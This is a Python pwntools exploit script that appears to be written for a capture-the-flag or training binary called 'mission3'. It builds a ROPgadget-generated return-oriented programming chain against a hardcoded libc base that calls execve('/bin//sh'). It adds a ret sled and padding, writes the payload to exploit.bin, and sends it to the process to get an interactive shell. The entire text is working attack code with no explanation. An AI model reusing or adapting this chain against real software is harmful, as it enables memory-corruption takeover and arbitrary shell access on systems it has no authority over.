

from pwn import *

buffer_len = 0x1000

libc_base =   0xf7e15000

ret = 0x08048316

#!/usr/bin/env python2
# execve generated by ROPgadget

from struct import pack

p = ""

p += pack('<I', libc_base + 0x00001aa6) # pop edx ; ret
p += pack('<I', libc_base + 0x001b2040) # @ .data
p += pack('<I', libc_base + 0x0002406e) # pop eax ; ret
p += '/bin'
p += pack('<I', libc_base + 0x0006bf9b) # mov dword ptr [edx], eax ; ret
p += pack('<I', libc_base + 0x00001aa6) # pop edx ; ret
p += pack('<I', libc_base + 0x001b2044) # @ .data + 4
p += pack('<I', libc_base + 0x0002406e) # pop eax ; ret
p += '//sh'
p += pack('<I', libc_base + 0x0006bf9b) # mov dword ptr [edx], eax ; ret
p += pack('<I', libc_base + 0x00001aa6) # pop edx ; ret
p += pack('<I', libc_base + 0x001b2048) # @ .data + 8
p += pack('<I', libc_base + 0x0002c79c) # xor eax, eax ; ret
p += pack('<I', libc_base + 0x0006bf9b) # mov dword ptr [edx], eax ; ret
p += pack('<I', libc_base + 0x00018395) # pop ebx ; ret
p += pack('<I', libc_base + 0x001b2040) # @ .data
p += pack('<I', libc_base + 0x000b5377) # pop ecx ; ret
p += pack('<I', libc_base + 0x001b2048) # @ .data + 8
p += pack('<I', libc_base + 0x00001aa6) # pop edx ; ret
p += pack('<I', libc_base + 0x001b2048) # @ .data + 8
p += pack('<I', libc_base + 0x0002c79c) # xor eax, eax ; ret
p += pack('<I', libc_base + 0x00024b41) # inc eax ; ret
p += pack('<I', libc_base + 0x00024b41) # inc eax ; ret
p += pack('<I', libc_base + 0x00024b41) # inc eax ; ret
p += pack('<I', libc_base + 0x00024b41) # inc eax ; ret
p += pack('<I', libc_base + 0x00024b41) # inc eax ; ret
p += pack('<I', libc_base + 0x00024b41) # inc eax ; ret
p += pack('<I', libc_base + 0x00024b41) # inc eax ; ret
p += pack('<I', libc_base + 0x00024b41) # inc eax ; ret
p += pack('<I', libc_base + 0x00024b41) # inc eax ; ret
p += pack('<I', libc_base + 0x00024b41) # inc eax ; ret
p += pack('<I', libc_base + 0x00024b41) # inc eax ; ret
p += pack('<I', libc_base + 0x00002c87) # int 0x80


exploit = ""
for _ in range(100):
	exploit += p32(ret)

exploit += p

exploit += "A" * (buffer_len - len(exploit))

with open("exploit.bin", "wb") as f:
	f.write(exploit)

print(exploit)

p = process("../mission3")

p.send(exploit)

p.interactive()
